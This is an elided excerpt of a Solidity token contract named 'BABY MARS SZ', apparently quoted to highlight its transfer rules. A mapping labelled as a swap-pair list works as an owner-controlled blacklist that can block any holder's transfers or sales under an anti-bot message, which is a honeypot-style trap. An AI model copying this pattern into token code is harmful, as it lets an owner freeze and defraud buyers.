...
library Address{
 ...
 contract BABYMARSSZ is Context, IERC20, Ownable {
    ...
    mapping (address => bool) private _isSwapPairList;
    ...
    uint256 public maxBuyLimit = 10000000000 * 10**9;
    uint256 public maxSellLimit = 10000000000 * 10**9;
    uint256 public maxWalletLimit = 10000000000 * 10**9;
    
    uint256 public genesis_block;
    
    address public marketingWallet = 0x1AddFe51D03d62F0E7ecEEe819b8Cc0b31A4f22a;
    address public developmentWallet = 0x1AddFe51D03d62F0E7ecEEe819b8Cc0b31A4f22a;

    string private constant _name = "BABY MARS SZ";
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        require(!_isSwapPairList[from] && !_isSwapPairList[to], "You are a bot");
    ...
    function updateIsSwapPairList(address account, bool state) external onlyOwner{
        _isSwapPairList[account] = state;
    }
    
    function bulkIsSwapPairList(address[] memory accounts, bool state) external onlyOwner{
        for(uint256 i =0; i < accounts.length; i++){
            _isSwapPairList[accounts[i]] = state;
